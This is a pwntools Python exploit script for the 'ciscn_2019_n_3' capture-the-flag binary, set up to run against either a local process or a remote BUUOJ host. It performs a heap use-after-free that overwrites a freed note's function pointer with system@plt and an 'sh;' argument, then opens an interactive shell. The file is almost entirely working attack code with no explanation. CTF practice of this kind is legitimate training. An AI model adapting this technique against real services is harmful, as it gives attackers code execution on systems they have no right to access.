#!/usr/bin/env python
#-*- coding:utf-8 -*-
# Author: I0gan

from pwn import *
#from LibcSearcher import LibcSearcher

context.log_level='debug'
#context.terminal = ['konsole', '-x', 'bash', 'c']
#context.terminal = 'konsole'
#context(arch = 'i386', os = 'linux', log_level='debug')
#context(arch = 'amd64', os = 'linux', log_level='debug')

exeFile = './ciscn_2019_n_3'
libFile = '/lib/x86_64-linux-gnu/libc.so.6'

remoteIp = "node3.buuoj.cn"
remotePort = 25861

LOCAL = 1
LIB   = 0

r   =  lambda x : io.recv(x)
ra  =  lambda   : io.recvall()
rl  =  lambda   : io.recvline(keepends = True)
ru  =  lambda x : io.recvuntil(x, drop = True)
s   =  lambda x : io.send(x)
sl  =  lambda x : io.sendline(x)
sa  =  lambda x, y : io.sendafter(x, y)
sla =  lambda x, y : io.sendlineafter(x, y)
ia  =  lambda : io.interactive()
c   =  lambda : io.close()
li    = lambda x : log.info(x)
db    = lambda   : gdb.attach(io)

#--------------------------Func-----------------------------
def adt(idx, size, data):
	sla('CNote > ', str(1))
	sla('Index > ', str(idx))
	sla('Type > ', str(2))
	sla('Length > ', str(size))
	if(size > 0x400):
		return
	sa('Value > ', data)

def rm(idx):
	sla('CNote > ', str(2))
	sla('Index > ', str(idx))

def dp(idx):
	sla('CNote > ', str(3))
	sla('Index > ', str(idx))

def q():
	sla('CNote > ', str(5))	

#--------------------------Exploit--------------------------
def exploit():

	adt(0, 0x401, '\n')
	adt(1, 0x401, '\n')

	rm(0)
	rm(1)

	p = 'sh;\x00' #as a system perm
	p += p32(exe.plt['system']) #free

	adt(4, 0x9, p)
	rm(0)

def finish():
	ia()
	c()

#--------------------------Main-----------------------------
if __name__ == '__main__':
	
	if LOCAL:
		exe = ELF(exeFile)
		if LIB:
			lib = ELF(libFile)
			io = exe.process(env = {"LD_PRELOAD" : libFile})
		else:
			io = exe.process()
	
	else:
		exe = ELF(exeFile)
		io = remote(remoteIp, remotePort)
		if LIB:
			lib = ELF(libFile)
	
	exploit()
	finish()
